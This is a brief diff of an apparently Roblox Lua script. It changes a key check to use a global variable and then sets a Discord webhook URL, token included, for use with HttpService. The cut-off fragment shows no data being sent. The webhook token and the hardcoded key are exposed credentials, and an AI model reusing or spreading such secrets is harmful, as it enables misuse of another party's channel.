@@ -1,5 +1,5 @@
 
-if key == 'Skyed2QQerdfdDSA' then
+if _G.key == 'Skyed2QQerdfdDSA' then
 HttpService = game:GetService("HttpService")
 local Webhook_URL = 'https://discord.com/api/webhooks/1045164406201389076/YLhpsE88D_r7t7uUZXvG9KyT9zpEuJBe7kVCSG7JcyX0Hn6BiQAI59r87nFF7DJbkI9b'
 
